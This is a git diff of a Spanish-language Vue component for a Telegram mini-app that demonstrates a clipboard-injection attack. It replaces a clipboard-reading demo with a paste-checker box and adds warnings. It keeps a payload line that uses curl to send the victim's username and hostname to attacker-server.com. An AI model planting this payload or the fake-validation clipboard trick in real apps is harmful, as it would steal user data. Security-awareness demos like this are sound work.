@@ -6,6 +6,7 @@ import { popup } from '@tma.js/sdk-vue';
 const isValidating = ref(false);
 const validationStatus = ref<'idle' | 'success' | 'error'>('idle');
 const maliciousPayload = 'curl -X POST https://attacker-server.com/steal-data -d "$(whoami):$(hostname)"';
+const pastedContent = ref<string>('');
 
 /**
  * Función que simula una validación pero en realidad inyecta código malicioso en el portapapeles
@@ -67,33 +68,12 @@ async function handleValidation() {
   }
 }
 
-/**
- * Función para mostrar lo que hay en el portapapeles (para la demo)
- */
-async function showClipboardContent() {
-  try {
-    if (navigator.clipboard && navigator.clipboard.readText) {
-      const text = await navigator.clipboard.readText();
-      await popup.show({
-        title: '📋 Contenido del Portapapeles',
-        message: text || '(vacío)',
-        buttons: [{ id: 'ok', type: 'default', text: 'OK' }],
-      });
-    } else {
-      await popup.show({
-        title: '⚠️ Aviso',
-        message: 'La lectura del portapapeles no está disponible en este navegador.',
-        buttons: [{ id: 'ok', type: 'default', text: 'OK' }],
-      });
-    }
-  } catch (error) {
-    console.error('Error al leer el portapapeles:', error);
-    await popup.show({
-      title: '⚠️ Aviso',
-      message: 'No se pudo leer el portapapeles. Es posible que necesites dar permisos.',
-      buttons: [{ id: 'ok', type: 'default', text: 'OK' }],
-    });
-  }
+function handlePaste() {
+  // El contenido ya estará en pastedContent gracias al v-model
+}
+
+function clearContent() {
+  pastedContent.value = '';
 }
 </script>
 
@@ -138,20 +118,6 @@ async function showClipboardContent() {
         </div>
       </div>
 
-      <div class="demo-controls">
-        <h4>🔧 Controles de Demo</h4>
-        <button
-          class="demo-button"
-          @click="showClipboardContent"
-        >
-          📋 Ver Portapapeles
-        </button>
-        <div class="payload-info">
-          <h5>Payload Inyectado:</h5>
-          <code>{{ maliciousPayload }}</code>
-        </div>
-      </div>
-
       <div class="explanation">
         <h4>📚 Explicación del Ataque</h4>
         <ol>
@@ -160,6 +126,46 @@ async function showClipboardContent() {
           <li><strong>Ejecución del Payload:</strong> La víctima pega y ejecuta el comando sin revisarlo</li>
           <li><strong>Compromiso:</strong> El comando roba información o instala malware</li>
         </ol>
+      </div>
+
+      <div class="clipboard-checker">
+        <h4>🔍 Verificar el Ataque (Para Demostración)</h4>
+        <p class="checker-description">
+          <strong>⚠️ NO EJECUTES EL COMANDO EN TU TERMINAL.</strong> En su lugar, pega aquí (Ctrl+V o Cmd+V)
+          el contenido de tu portapapeles para verificar que el payload malicioso ha sido inyectado.
+        </p>
+        <textarea
+          v-model="pastedContent"
+          class="paste-area"
+          placeholder="Pega aquí el contenido de tu portapapeles (Ctrl+V o Cmd+V)..."
+          @paste="handlePaste"
+        ></textarea>
+        <div
+          class="button-group"
+          v-if="pastedContent"
+        >
+          <button
+            class="clear-button"
+            @click="clearContent"
+          >
+            🗑️ Limpiar
+          </button>
+        </div>
+        <div
+          v-if="pastedContent"
+          class="result-box"
+        >
+          <p class="result-label">✅ Contenido detectado en portapapeles:</p>
+          <code class="result-content">{{ pastedContent }}</code>
+        </div>
+        <div class="payload-info">
+          <h5>Payload que fue inyectado:</h5>
+          <code>{{ maliciousPayload }}</code>
+          <p class="payload-warning">
+            ⚠️ Este comando, si se ejecutara en un terminal real, enviaría tu nombre de usuario y hostname a un servidor
+            del atacante.
+          </p>
+        </div>
       </div>
     </div>
   </AppPage>
@@ -288,32 +294,99 @@ async function showClipboardContent() {
   font-size: 14px;
 }
 
-.demo-controls {
-  background: var(--tg-theme-secondary-bg-color, #f5f5f5);
-  padding: 20px;
+.clipboard-checker {
+  background: var(--tg-theme-bg-color, #fff);
+  padding: 24px;
   border-radius: 12px;
+  border: 2px solid var(--tg-theme-hint-color, #999);
 }
 
-.demo-controls h4 {
-  margin: 0 0 16px 0;
+.clipboard-checker h4 {
+  margin: 0 0 12px 0;
   color: var(--tg-theme-text-color, #000);
+  font-size: 18px;
 }
 
-.demo-button {
+.checker-description {
+  font-size: 14px;
+  line-height: 1.5;
+  color: var(--tg-theme-text-color, #000);
+  opacity: 0.8;
+  margin: 0 0 16px 0;
+}
+
+.paste-area {
   width: 100%;
+  min-height: 100px;
   padding: 12px;
-  font-size: 16px;
-  color: var(--tg-theme-button-text-color, white);
-  background: var(--tg-theme-button-color, #3390ec);
-  border: none;
+  font-family: 'Courier New', monospace;
+  font-size: 14px;
+  color: var(--tg-theme-text-color, #000);
+  background: var(--tg-theme-bg-color, #fff);
+  border: 2px solid var(--tg-theme-section-separator-color, #e0e0e0);
+  border-radius: 8px;
+  resize: vertical;
+  transition: border-color 0.2s;
+}
+
+.paste-area:focus {
+  outline: none;
+  border-color: var(--tg-theme-button-color, #3390ec);
+}
+
+.paste-area::placeholder {
+  color: var(--tg-theme-hint-color, #999);
+  font-style: italic;
+}
+
+.button-group {
+  display: flex;
+  gap: 10px;
+  margin-top: 12px;
+}
+
+.clear-button {
+  padding: 10px 16px;
+  font-size: 14px;
+  font-weight: 600;
+  color: var(--tg-theme-destructive-text-color, #ff3b30);
+  background: transparent;
+  border: 2px solid var(--tg-theme-destructive-text-color, #ff3b30);
   border-radius: 8px;
   cursor: pointer;
-  transition: opacity 0.2s;
-  margin-bottom: 16px;
+  transition: all 0.2s ease;
 }
 
-.demo-button:hover {
-  opacity: 0.9;
+.clear-button:hover {
+  background: var(--tg-theme-destructive-text-color, #ff3b30);
+  color: white;
+}
+
+.result-box {
+  margin-top: 16px;
+  padding: 16px;
+  background: #e8f5e9;
+  border: 2px solid #4caf50;
+  border-radius: 8px;
+}
+
+.result-label {
+  margin: 0 0 8px 0;
+  font-weight: 600;
+  color: #2e7d32;
+  font-size: 14px;
+}
+
+.result-content {
+  display: block;
+  padding: 12px;
+  background: #fff;
+  border-radius: 6px;
+  font-family: 'Courier New', monospace;
+  font-size: 13px;
+  color: #000;
+  word-break: break-all;
+  white-space: pre-wrap;
 }
 
 .payload-info {
@@ -336,6 +409,17 @@ async function showClipboardContent() {
   font-size: 12px;
   word-break: break-all;
   overflow-x: auto;
+}
+
+.payload-warning {
+  margin-top: 12px;
+  padding: 12px;
+  background: #fff3cd;
+  border: 1px solid #ffc107;
+  border-radius: 6px;
+  color: #856404;
+  font-size: 13px;
+  line-height: 1.5;
 }
 
 .explanation {
